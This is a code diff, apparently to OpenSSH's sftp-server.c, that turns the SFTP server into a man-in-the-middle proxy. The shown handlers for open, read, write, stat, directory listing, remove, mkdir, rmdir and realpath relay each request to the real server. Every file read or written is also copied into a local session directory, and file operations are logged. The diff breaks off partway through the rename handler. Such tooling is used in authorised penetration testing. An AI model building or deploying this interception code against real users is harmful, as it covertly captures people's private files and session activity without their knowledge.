@@ -39,6 +39,7 @@
 #include <time.h>
 #include <unistd.h>
 #include <stdarg.h>
+#include <sys/wait.h>
 
 #include "xmalloc.h"
 #include "sshbuf.h"
@@ -50,6 +51,8 @@
 
 #include "sftp.h"
 #include "sftp-common.h"
+#include "sftp-client.h"
+#include "lol.h"
 
 /* Our verbosity */
 static LogLevel log_level = SYSLOG_LEVEL_ERROR;
@@ -74,14 +77,40 @@ static int readonly;
 /* Requests that are allowed/denied */
 static char *request_whitelist, *request_blacklist;
 
-/* portable attributes, etc. */
-typedef struct Stat Stat;
+pid_t sshpid = -1;
+volatile sig_atomic_t interrupted = 0;
+int showprogress = 0;
+extern struct sftp_conn *client_conn;
+int session_log_fd = -1;      /* A descriptor to this session's log file. */
+char *session_log_dir = NULL; /* The directory to store SFTP files in. */
 
-struct Stat {
-	char *name;
-	char *long_name;
-	Attrib attrib;
+#define MITM_HANDLE_TYPE_FILE 0
+#define MITM_HANDLE_TYPE_DIR 1
+
+/* This maps a remote server's handle to a local file descriptor. */
+typedef struct MITMHandle MITMHandle;
+struct MITMHandle {
+  int in_use;          /* If 1, this slot is in use, otherwise it is unallocated.  */
+  u_int type;          /* One of the MITM_HANDLE_TYPE_ flags. */
+  char *handle_str;    /* The file handle on the remote server. */
+  size_t handle_len;   /* The number of bytes the above file handle is. */
+  int fd;              /* The local file descriptor. */
+  u_int32_t pflags;    /* The portable flags this file was opened with. */
+  char *original_path; /* The full path of the original file transferred. */
+  char *actual_path;   /* The relative path that the file was saved to locally. */
+  char *file_listing;  /* The file listing (if type == MITM_HANDLE_TYPE_DIR). */
+  size_t file_listing_size; /* The size of the file_listing buffer. */
 };
+
+MITMHandle *mitm_handles = NULL; /* Our array of handles. */
+u_int num_mitm_handles = 0;  /* The current size of the mitm_handles array. */
+
+/* When mitm_handles runs out of free slots, it will grow by this many. */
+#define MITM_HANDLES_NEW_BLOCK 16
+
+/* The block size that the MITMHandle.file_listing buffer grows by. */
+#define MITM_HANDLES_FILE_LISTING_BLOCK 1024
+
 
 /* Packet handlers */
 static void process_open(u_int32_t id);
@@ -108,6 +137,29 @@ static void process_extended_fstatvfs(u_int32_t id);
 static void process_extended_hardlink(u_int32_t id);
 static void process_extended_fsync(u_int32_t id);
 static void process_extended(u_int32_t id);
+
+struct sftp_conn *make_connection(char *host, unsigned short port, char *username, char *password_and_fingerprint_socket_name);
+void mitm_init_log(char *log_filepath, char *log_dir);
+void mitm_handle_close(const char *handle_str, size_t handle_len);
+void mitm_handle_free(MITMHandle *mh);
+void mitm_handle_init(MITMHandle *mh);
+void mitm_handle_new(u_int type, char *original_name, u_int32_t pflags, const char *handle_str, size_t handle_len);
+void mitm_handle_read_write(char *handle_str, size_t handle_len, u_int64_t offset, u_char *buf, size_t buf_len);
+MITMHandle *mitm_handle_search(const char *handle_str, size_t handle_len);
+void sftp_log(u_int status, const char *fmt, ...);
+void sftp_log_no_filter(u_int status, const char *fmt, ...);
+void _sftp_log(u_int status, u_int do_xss_filtering, char *buf, int buf_len);
+void sftp_log_close(u_int status, char *handle_str, size_t handle_len);
+void sftp_log_attrib(const char *func, u_int status, char *name, Attrib *a);
+void sftp_log_handle_attrib(const char *func, u_int status, char *handle_str, size_t handle_len, Attrib *a);
+void sftp_log_readdir(char *handle_str, size_t handle_len, char *listing);
+void sftp_log_statvfs(u_int status, char *path, struct statvfs *st);
+void sftp_log_fstatvfs(u_int status, char *handle_str, size_t handle_len, struct statvfs *st);
+void sftp_log_fsync(u_int status, char *handle_str, size_t handle_len);
+void xss_sanitize(char *buf, int buf_len);
+
+/* The error message for functions that search for file handles. */
+#define CANT_FIND_HANDLE "MITM: %s: can't find handle!"
 
 struct sftp_handler {
 	const char *name;	/* user-visible name for fine-grained perms */
@@ -179,6 +231,7 @@ request_permitted(struct sftp_handler *h)
 	return 1;
 }
 
+/*
 static int
 errno_to_portable(int unixerrno)
 {
@@ -236,7 +289,7 @@ flags_from_portable(int pflags)
 		flags |= O_EXCL;
 	return flags;
 }
-
+*/
 static const char *
 string_from_portable(int pflags)
 {
@@ -266,6 +319,7 @@ string_from_portable(int pflags)
 	return ret;
 }
 
+
 /* handle handles */
 
 typedef struct Handle Handle;
@@ -289,6 +343,195 @@ Handle *handles = NULL;
 u_int num_handles = 0;
 int first_unused_handle = -1;
 
+
+/* Frees a handle slot and re-initializes it. */
+void mitm_handle_free(MITMHandle *mh) {
+  if (mh != NULL) {
+    free(mh->handle_str);
+    free(mh->original_path);
+    free(mh->actual_path);
+    free(mh->file_listing);
+    mitm_handle_init(mh);
+  }
+}
+
+/* Initializes a handle slot. Use mitm_handle_free() on previously-occupied
+ * slots. */
+void mitm_handle_init(MITMHandle *mh) {
+  if (mh != NULL) {
+    mh->in_use = 0;
+    mh->type = 0;
+    mh->handle_str = NULL;
+    mh->handle_len = 0;
+    mh->fd = -1;
+    mh->pflags = 0;
+    mh->original_path = NULL;
+    mh->actual_path = NULL;
+    mh->file_listing = NULL;
+    mh->file_listing_size = 0;
+  }
+}
+
+/* Adds a new handle, given its type (MITM_HANDLE_TYPE_{FILE,DIR}), original
+ * path, open flags, and remote server handle. */
+void mitm_handle_new(u_int type, char *original_path, u_int32_t pflags, const char *handle_str, size_t handle_len) {
+  int unused_handle = -1, actual_path_len = 0;;
+  u_int i = 0, num_tries = 0, r = 0;
+  char file_path[PATH_MAX];
+  char *file_prefix = NULL, *temp_name = NULL, *log_dir = NULL;
+
+  /* On first invokation, the mitm_handles array is unallocated. */
+  if (mitm_handles == NULL) {
+    if ((mitm_handles = reallocarray(NULL, MITM_HANDLES_NEW_BLOCK, sizeof(MITMHandle))) == NULL)
+      fatal("Could not allocate array for MITMHandles.");
+
+    num_mitm_handles = MITM_HANDLES_NEW_BLOCK;
+
+    /* Initializes all the slots. */
+    for (i = 0; i < num_mitm_handles; i++)
+      mitm_handle_init(&mitm_handles[i]);
+
+    /* Since we just allocated a new array, we know slot 0 is unoccupied. */
+    unused_handle = 0;
+  }
+
+  /* Sequentially search for an unused slot in the array. */
+  for (i = 0; (i < num_mitm_handles) && (unused_handle == -1); i++) {
+    /* If we found one, save its slot index. */
+    if (mitm_handles[i].in_use == 0)
+      unused_handle = i;
+  }
+
+  /* If, after searching the entire array, we haven't found an open slot, we
+   * must grow the array. */
+  if (unused_handle == -1) {
+    unused_handle = num_mitm_handles;
+
+    /* Make the array bigger by one block size. */
+    num_mitm_handles += MITM_HANDLES_NEW_BLOCK;
+    if ((mitm_handles = reallocarray(mitm_handles, num_mitm_handles, sizeof(MITMHandle))) == NULL)
+      fatal("Could not allocate array for MITMHandles.");
+
+    /* Initialize the slots we just expanded. */
+    for (; i < num_mitm_handles; i++)
+      mitm_handle_init(&mitm_handles[i]);
+  }
+
+  /* Mark this slot as being in use. */
+  mitm_handles[unused_handle].in_use = 1;
+
+  /* Set the file/directory flag. */
+  mitm_handles[unused_handle].type = type;
+
+  /* Allocate a buffer for the remote server handle data, then copy it. */
+  if ((mitm_handles[unused_handle].handle_str = xmalloc(handle_len)) == NULL)
+    fatal("Could not allocate array for handle string.");
+  memcpy(mitm_handles[unused_handle].handle_str, handle_str, handle_len);
+
+  /* Set the handle length. */
+  mitm_handles[unused_handle].handle_len = handle_len;
+
+  /* Copy the original full path of the file being opened on the remote
+   * server, and do XSS filtering on it. */
+  mitm_handles[unused_handle].original_path = xstrdup(original_path);
+  xss_sanitize(mitm_handles[unused_handle].original_path, strlen(mitm_handles[unused_handle].original_path));
+
+  /* Save the portable flags its being opened with. */
+  mitm_handles[unused_handle].pflags = pflags;
+
+  /* If this is a file, find a unique local filename, and open a handle to
+   * it. */
+  if (type == MITM_HANDLE_TYPE_FILE) {
+
+    /* Extract the filename of the path. */
+    temp_name = xstrdup(original_path);
+    file_prefix = basename(temp_name);
+
+    /* Ensure that a relative path wasn't snuck in. */
+    if ((memmem(file_prefix, strlen(file_prefix), "..", 2) != NULL) || (memmem(file_prefix, strlen(file_prefix), "/", 1) != NULL))
+      file_prefix = "file";
+
+    /* Construct a path to save the file to locally, such as
+     * "/home/ssh-mitm/sftp_session_0/lol.txt". */
+    snprintf(file_path, sizeof(file_path) - 1, "%s%s", session_log_dir, file_prefix);
+
+    /* Find a unique local filename. */
+    while (mitm_handles[unused_handle].fd < 0) {
+      mitm_handles[unused_handle].fd = open(file_path, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_WRONLY, S_IRUSR | S_IWUSR);
+
+      num_tries++;
+
+      /* If open() failed, append "_X" to the file path, where X is an
+       * incrementing integer. */
+      if (mitm_handles[unused_handle].fd < 0) {
+	snprintf(file_path, sizeof(file_path) - 1, "%s%s_%u", session_log_dir, file_prefix, num_tries);
+      }
+    }
+    free(temp_name); temp_name = NULL;
+
+    /* Get the base name of our log directory.  Because we're using GNU
+     * basename(), we need to cut off the trailing slash, otherwise we get back
+     * the empty string.
+     *
+     * "/home/ssh-mitm/sftp_session_0/" -> "sftp_session_0" */
+    temp_name = xstrdup(session_log_dir);
+    if (strlen(temp_name) > 0)
+      temp_name[strlen(temp_name) - 1] = '\0';
+    log_dir = basename(temp_name);
+
+    /* Get the basename of the file we wrote.
+     * "/home/ssh-mitm/sftp_session_0/lol.txt" -> "lol.txt" */
+    file_prefix = basename(file_path);
+    actual_path_len = strlen(log_dir) + 1 + strlen(file_prefix) + 1;
+    mitm_handles[unused_handle].actual_path = calloc(actual_path_len, sizeof(char));
+
+    /* Create the relative path, i.e.: "sftp_session_0/lol.txt". */
+    r = snprintf(mitm_handles[unused_handle].actual_path, actual_path_len, "%s/%s", log_dir, file_prefix);
+    xss_sanitize(mitm_handles[unused_handle].actual_path, r);
+
+    free(temp_name); temp_name = NULL;
+  }
+}
+
+/* Write discovered data to our local file.  We do this for both remote server
+ * reads and writes. */
+void mitm_handle_read_write(char *handle_str, size_t handle_len, u_int64_t offset, u_char *buf, size_t buf_len) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {
+    lseek(mh->fd, offset, SEEK_SET);
+    write(mh->fd, buf, buf_len);
+  } else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Close the local file descriptor associated with this remote server handle.
+ * Frees the slot this handle is in. */
+void mitm_handle_close(const char *handle_str, size_t handle_len) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {
+    close(mh->fd);
+    mitm_handle_free(mh);
+  } else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Searches for an MITMHandle, given its remote server handle and length.
+ * Returns a pointer to it on success, or NULL if it could not be found. */
+MITMHandle *mitm_handle_search(const char *handle_str, size_t handle_len) {
+  u_int i = 0;
+
+  for (i = 0; i < num_mitm_handles; i++) {
+    if ((mitm_handles[i].in_use == 1) && (mitm_handles[i].handle_len == handle_len) && (memcmp(mitm_handles[i].handle_str, handle_str, handle_len) == 0)) {
+      return &mitm_handles[i];
+    }
+  }
+  return NULL;
+}
+
+
+/*
 static void handle_unused(int i)
 {
 	handles[i].use = HANDLE_UNUSED;
@@ -321,6 +564,7 @@ handle_new(int use, const char *name, int fd, int flags, DIR *dirp)
 
 	return i;
 }
+*/
 
 static int
 handle_is_ok(int i, int type)
@@ -328,6 +572,7 @@ handle_is_ok(int i, int type)
 	return i >= 0 && (u_int)i < num_handles && handles[i].use == type;
 }
 
+/*
 static int
 handle_to_string(int handle, u_char **stringp, int *hlenp)
 {
@@ -338,6 +583,7 @@ handle_to_string(int handle, u_char **stringp, int *hlenp)
 	*hlenp = sizeof(int32_t);
 	return 0;
 }
+*/
 
 static int
 handle_from_string(const u_char *handle, u_int hlen)
@@ -362,6 +608,7 @@ handle_to_name(int handle)
 	return NULL;
 }
 
+/*
 static DIR *
 handle_to_dir(int handle)
 {
@@ -399,6 +646,7 @@ handle_update_write(int handle, ssize_t bytes)
 	if (handle_is_ok(handle, HANDLE_FILE) && bytes > 0)
 		handles[handle].bytes_write += bytes;
 }
+*/
 
 static u_int64_t
 handle_bytes_read(int handle)
@@ -416,6 +664,7 @@ handle_bytes_write(int handle)
 	return 0;
 }
 
+/*
 static int
 handle_close(int handle)
 {
@@ -434,6 +683,7 @@ handle_close(int handle)
 	}
 	return ret;
 }
+*/
 
 static void
 handle_log_close(int handle, char *emsg)
@@ -461,6 +711,7 @@ handle_log_exit(void)
 			handle_log_close(i, "forced");
 }
 
+/*
 static int
 get_handle(struct sshbuf *queue, int *hp)
 {
@@ -474,6 +725,28 @@ get_handle(struct sshbuf *queue, int *hp)
 	if (hlen < 256)
 		*hp = handle_from_string(handle, hlen);
 	free(handle);
+	return 0;
+}
+*/
+
+/* Handle return value must be free()'ed. */
+int
+get_handle_all(struct sshbuf *queue, u_char **handle_str, size_t *handle_len, int *handle_int)
+{
+	int r;
+
+	if ((r = sshbuf_get_string(queue, handle_str, handle_len)) != 0)
+	  return r;
+
+	if (*handle_len < 256)
+		*handle_int = handle_from_string(*handle_str, *handle_len);
+	else {
+		free(*handle_str); *handle_str = NULL;
+		*handle_len = 0;
+		*handle_int = -1;
+		return -1;
+	}
+
 	return 0;
 }
 
@@ -555,6 +828,7 @@ send_data(u_int32_t id, const u_char *data, int dlen)
 	send_data_or_handle(SSH2_FXP_DATA, id, data, dlen);
 }
 
+/*
 static void
 send_handle(u_int32_t id, int handle)
 {
@@ -566,6 +840,15 @@ send_handle(u_int32_t id, int handle)
 	send_data_or_handle(SSH2_FXP_HANDLE, id, string, hlen);
 	free(string);
 }
+*/
+
+static void
+send_handle_str(u_int32_t id, u_char *handle, size_t handle_len)
+{
+	debug("request %u: sent handle_str handle %d", id, atoi(handle));
+	send_data_or_handle(SSH2_FXP_HANDLE, id, handle, handle_len);
+}
+
 
 static void
 send_names(u_int32_t id, int count, const Stat *stats)
@@ -678,14 +961,18 @@ process_open(u_int32_t id)
 	u_int32_t pflags;
 	Attrib a;
 	char *name;
-	int r, handle, fd, flags, mode, status = SSH2_FX_FAILURE;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	u_int status = 0;
+	int r;
 
 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0 ||
 	    (r = sshbuf_get_u32(iqueue, &pflags)) != 0 || /* portable flags */
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug3("request %u: open flags %d", id, pflags);
+	debug3("request %u: open \"%s\" flags %d", id, name, pflags);
+	/*
 	flags = flags_from_portable(pflags);
 	mode = (a.flags & SSH2_FILEXFER_ATTR_PERMISSIONS) ? a.perm : 0666;
 	logit("open \"%s\" flags %s mode 0%o",
@@ -711,12 +998,25 @@ process_open(u_int32_t id)
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	handle_str = mitm_do_open(client_conn, name, pflags, &a, &handle_len, &status);
+	if (handle_str != NULL) {
+		debug3("request %u: open \"%s\" returning handle: %d", id, name, handle_from_string(handle_str, handle_len));
+		send_handle_str(id, handle_str, handle_len);
+		mitm_handle_new(MITM_HANDLE_TYPE_FILE, name, pflags, handle_str, handle_len);
+	} else {
+		send_status(id, status);
+		sftp_log(status, "open \"%s\" (Flags: %s)", name, string_from_portable(pflags));
+	}
+
+	free(handle_str);  handle_str = NULL;
 	free(name);
 }
 
 static void
 process_close(u_int32_t id)
 {
+	/*
 	int r, handle, ret, status = SSH2_FX_FAILURE;
 
 	if ((r = get_handle(iqueue, &handle)) != 0)
@@ -727,11 +1027,28 @@ process_close(u_int32_t id)
 	ret = handle_close(handle);
 	status = (ret == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int status;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	debug3("request %u: close handle %u", id, handle_int);
+	status = mitm_do_close(client_conn, handle_str, handle_len);
+	send_status(id, status);
+
+	sftp_log_close(status, handle_str, handle_len);
+	mitm_handle_close(handle_str, handle_len);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
 process_read(u_int32_t id)
 {
+	/*
 	u_char buf[64*1024];
 	u_int32_t len;
 	int r, handle, fd, ret, status = SSH2_FX_FAILURE;
@@ -768,11 +1085,39 @@ process_read(u_int32_t id)
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	u_int32_t read_len;
+	u_int64_t offset;
+	u_int status = 0;
+	u_char *buf = NULL;
+	size_t buf_len = 0;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||
+	    (r = sshbuf_get_u32(iqueue, &read_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: read (handle %d) off %llu len %d",
+	    id, handle_int, (unsigned long long)offset, read_len);
+	buf = mitm_do_read(client_conn, handle_str, handle_len, offset, read_len, &buf_len, &status);
+	if (buf != NULL) {
+		send_data(id, buf, buf_len);
+		mitm_handle_read_write(handle_str, handle_len, offset, buf, buf_len);
+	} else
+		send_status(id, status);
+
+	free(buf); buf = NULL;
+	free(handle_str); handle_str = NULL;
 }
 
 static void
 process_write(u_int32_t id)
 {
+	/*
 	u_int64_t off;
 	size_t len;
 	int r, handle, fd, ret, status;
@@ -795,7 +1140,9 @@ process_write(u_int32_t id)
 			status = errno_to_portable(errno);
 			error("process_write: seek failed");
 		} else {
+	*/
 /* XXX ATOMICIO ? */
+	/*
 			ret = write(fd, data, len);
 			if (ret < 0) {
 				error("process_write: write failed");
@@ -811,21 +1158,44 @@ process_write(u_int32_t id)
 	}
 	send_status(id, status);
 	free(data);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	u_int64_t offset;
+	u_int status;
+	u_char *buf = NULL;
+	size_t buf_len = 0;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = sshbuf_get_u64(iqueue, &offset)) != 0 ||
+	    (r = sshbuf_get_string(iqueue, &buf, &buf_len)) != 0)
+
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	debug3("request %u: write (handle %d) off %llu len %zu",
+	    id, handle_int, (unsigned long long)offset, buf_len);
+	status = mitm_do_write(client_conn, handle_str, handle_len, offset, buf, buf_len);
+	mitm_handle_read_write(handle_str, handle_len, offset, buf, buf_len);
+	send_status(id, status);
+
+	free(handle_str); handle_str = NULL;
+	free(buf); buf = NULL;
 }
 
 static void
-process_do_stat(u_int32_t id, int do_lstat)
+process_do_stat(u_int32_t id, int do_lstat_arg)
 {
-	Attrib a;
-	struct stat st;
 	char *name;
 	int r, status = SSH2_FX_FAILURE;
+	Attrib *b;
 
 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug3("request %u: %sstat", id, do_lstat ? "l" : "");
-	verbose("%sstat name \"%s\"", do_lstat ? "l" : "", name);
+	debug3("request %u: %sstat", id, do_lstat_arg ? "l" : "");
+	verbose("%sstat name \"%s\"", do_lstat_arg ? "l" : "", name);
+	/*
 	r = do_lstat ? lstat(name, &st) : stat(name, &st);
 	if (r < 0) {
 		status = errno_to_portable(errno);
@@ -836,6 +1206,18 @@ process_do_stat(u_int32_t id, int do_lstat)
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	if (do_lstat_arg) 
+		b = do_lstat(client_conn, name, 0, &status);
+	else
+		b = do_stat(client_conn, name, 0, &status);
+
+	if (b != NULL)
+		send_attrib(id, b);
+	else
+		send_status(id, status);
+
+	sftp_log_attrib(do_lstat_arg ? "lstat" : "stat", status, name, b);
 	free(name);
 }
 
@@ -854,10 +1236,14 @@ process_lstat(u_int32_t id)
 static void
 process_fstat(u_int32_t id)
 {
-	Attrib a;
-	struct stat st;
-	int fd, r, handle, status = SSH2_FX_FAILURE;
+	Attrib *a;
+	int status = SSH2_FX_FAILURE;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug("request %u: fstat \"%s\" (handle %u)",
@@ -875,8 +1261,22 @@ process_fstat(u_int32_t id)
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fstat (handle %u)", id, handle_int);
+	a = mitm_do_fstat(client_conn, handle_str, handle_len, 1, &status);
+	if (a != NULL)
+		send_attrib(id, a);
+	else
+		send_status(id, status);
+
+	sftp_log_handle_attrib("fstat", status, handle_str, handle_len, a);
+	free(handle_str);  handle_str = NULL;
 }
 
+/*
 static struct timeval *
 attrib_to_tv(const Attrib *a)
 {
@@ -888,6 +1288,7 @@ attrib_to_tv(const Attrib *a)
 	tv[1].tv_usec = 0;
 	return tv;
 }
+*/
 
 static void
 process_setstat(u_int32_t id)
@@ -900,7 +1301,8 @@ process_setstat(u_int32_t id)
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug("request %u: setstat name \"%s\"", id, name);
+	debug3("request %u: setstat name \"%s\"", id, name);
+	/*
 	if (a.flags & SSH2_FILEXFER_ATTR_SIZE) {
 		logit("set \"%s\" size %llu",
 		    name, (unsigned long long)a.size);
@@ -932,7 +1334,11 @@ process_setstat(u_int32_t id)
 		if (r == -1)
 			status = errno_to_portable(errno);
 	}
+	*/
+	status = mitm_do_setstat(client_conn, name, &a);
 	send_status(id, status);
+
+	sftp_log_attrib("setstat", status, name, &a);
 	free(name);
 }
 
@@ -940,9 +1346,13 @@ static void
 process_fsetstat(u_int32_t id)
 {
 	Attrib a;
-	int handle, fd, r;
 	int status = SSH2_FX_OK;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0 ||
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
@@ -998,12 +1408,23 @@ process_fsetstat(u_int32_t id)
 				status = errno_to_portable(errno);
 		}
 	}
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = decode_attrib(iqueue, &a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fsetstat handle %d", id, handle_int);
+	status = mitm_do_fsetstat(client_conn, handle_str, handle_len, &a);
 	send_status(id, status);
+
+	sftp_log_handle_attrib("fsetstat", status, handle_str, handle_len, &a);
+	free(handle_str);  handle_str = NULL;
 }
 
 static void
 process_opendir(u_int32_t id)
 {
+	/*
 	DIR *dirp = NULL;
 	char *path;
 	int r, handle, status = SSH2_FX_FAILURE;
@@ -1028,12 +1449,31 @@ process_opendir(u_int32_t id)
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	int r, status = SSH2_FX_FAILURE;
+	char *path;
+	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug("request %u: opendir \"%s\"", id, path);
+
+	size_t handle_len = 0;
+	u_char *handle_str = mitm_do_opendir(client_conn, path, &handle_len, &status);
+	if (handle_str != NULL) {
+		debug("request %u: opendir \"%s\" returning handle: %u", id, path, handle_from_string(handle_str, handle_len));
+		send_handle_str(id, handle_str, handle_len);
+		mitm_handle_new(MITM_HANDLE_TYPE_DIR, path, 0, handle_str, handle_len);
+	} else
+		send_status(id, status);
+
+	free(handle_str);  handle_str = NULL;
 	free(path);
 }
 
 static void
 process_readdir(u_int32_t id)
 {
+	/*
 	DIR *dirp;
 	struct dirent *dp;
 	char *path;
@@ -1060,7 +1500,9 @@ process_readdir(u_int32_t id)
 				nstats *= 2;
 				stats = xreallocarray(stats, nstats, sizeof(Stat));
 			}
+	*/
 /* XXX OVERFLOW ? */
+	/*
 			snprintf(pathname, sizeof pathname, "%s%s%s", path,
 			    strcmp(path, "/") ? "/" : "", dp->d_name);
 			if (lstat(pathname, &st) < 0)
@@ -1069,8 +1511,10 @@ process_readdir(u_int32_t id)
 			stats[count].name = xstrdup(dp->d_name);
 			stats[count].long_name = ls_file(dp->d_name, &st, 0, 0);
 			count++;
+	*/
 			/* send up to 100 entries in one message */
 			/* XXX check packet size instead */
+	/*
 			if (count == 100)
 				break;
 		}
@@ -1085,6 +1529,32 @@ process_readdir(u_int32_t id)
 		}
 		free(stats);
 	}
+	*/
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
+	int status = 0;
+	u_int count = 0, i = 0;
+	Stat *stats;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error", __func__);
+
+	debug("request %u: readdir(handle %d)", id, handle_int);
+	stats = mitm_do_readdir(client_conn, id, handle_str, handle_len, &count, &status);
+	if (stats == NULL)
+		send_status(id, status);
+	else {
+		send_names(id, count, stats);
+		for (i = 0; i < count; i++) {
+			sftp_log_readdir(handle_str, handle_len, stats[i].long_name);
+			free(stats[i].name); stats[i].name = NULL;
+			free(stats[i].long_name); stats[i].long_name = NULL;
+		}
+		free(stats); stats = NULL;
+	}
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1098,9 +1568,15 @@ process_remove(u_int32_t id)
 
 	debug3("request %u: remove", id);
 	logit("remove name \"%s\"", name);
+	/*
 	r = unlink(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rm(client_conn, name);
+	send_status(id, status);
+
+	sftp_log(status, "rm \"%s\"", name);
 	free(name);
 }
 
@@ -1119,9 +1595,15 @@ process_mkdir(u_int32_t id)
 	    a.perm & 07777 : 0777;
 	debug3("request %u: mkdir", id);
 	logit("mkdir name \"%s\" mode 0%o", name, mode);
+	/*
 	r = mkdir(name, mode);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_mkdir(client_conn, name, &a);
+	send_status(id, status);
+
+	sftp_log(status, "mkdir \"%s\" (mode: 0%o)", name, mode);
 	free(name);
 }
 
@@ -1136,18 +1618,26 @@ process_rmdir(u_int32_t id)
 
 	debug3("request %u: rmdir", id);
 	logit("rmdir name \"%s\"", name);
+	/*
 	r = rmdir(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rmdir(client_conn, name);
+	send_status(id, status);
+
+	sftp_log(status, "rmdir \"%s\"", name);
 	free(name);
 }
 
 static void
 process_realpath(u_int32_t id)
 {
-	char resolvedname[PATH_MAX];
 	char *path;
 	int r;
+	char *realpath;
+	Stat s;
+	u_int status;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
@@ -1158,6 +1648,7 @@ process_realpath(u_int32_t id)
 	}
 	debug3("request %u: realpath", id);
 	verbose("realpath \"%s\"", path);
+	/*
 	if (realpath(path, resolvedname) == NULL) {
 		send_status(id, errno_to_portable(errno));
 	} else {
@@ -1166,6 +1657,17 @@ process_realpath(u_int32_t id)
 		s.name = s.long_name = resolvedname;
 		send_names(id, 1, &s);
 	}
+	*/
+	realpath = do_realpath(client_conn, path, &status);
+	if (status == SSH2_FX_OK) {
+	  attrib_clear(&s.attrib);
+	  s.name = s.long_name = realpath;
+	  send_names(id, 1, &s);
+	} else
+	  send_status(id, status);
+
+	sftp_log(status, "realpath \"%s\" (Result: %s)", path, realpath != NULL ? realpath : "(NULL)");
+	free(realpath); realpath = NULL;
 	free(path);
 }
 
@@ -1174,7 +1676,6 @@ process_rename(u_int32_t id)
 {
 	char *oldpath, *newpath;
 	int r, status;
-	struct stat sb;
 
 	if ((r = sshbuf_get_cstring(iqueue, &oldpath, NULL)) != 0 ||
 	    (r = sshbuf_get_cstring(iqueue, &newpath, NULL)) != 0)
@@ -1182,11 +1683,14 @@ process_rename(u_int32_t id)
 
 	debug3("request %u: rename", id);
 	logit("rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	status = SSH2_FX_FAILURE;
 	if (lstat(oldpath, &sb) == -1)
 		status = errno_to_portable(errno);
 	else if (S_ISREG(sb.st_mode)) {
+	*/
 		/* Race-free rename of regular files */
+	/*
 		if (link(oldpath, newpath) == -1) {
 			if (errno == EOPNOTSUPP || errno == ENOSYS
 #ifdef EXDEV
@@ -1198,10 +1702,12 @@ process_rename(u_int32_t id)
 			    ) {
 				struct stat st;
 
+	*/
 				/*
 				 * fs doesn't support links, so fall back to
 				 * stat+rename.  This is racy.
 				 */
+	/*
 				if (stat(newpath, &st) == -1) {
 					if (rename(oldpath, newpath) == -1)
 						status =
@@ -1214,7 +1720,9 @@ process_rename(u_int32_t id)
 			}
 		} else if (unlink(oldpath) == -1) {
 			status = errno_to_portable(errno);
+	*/
 			/* clean spare link */
+	/*
 			unlink(newpath);
 		} else
 			status = SSH2_FX_OK;
@@ -1224,7 +1732,11 @@ process_rename(u_int32_t id)
 		else
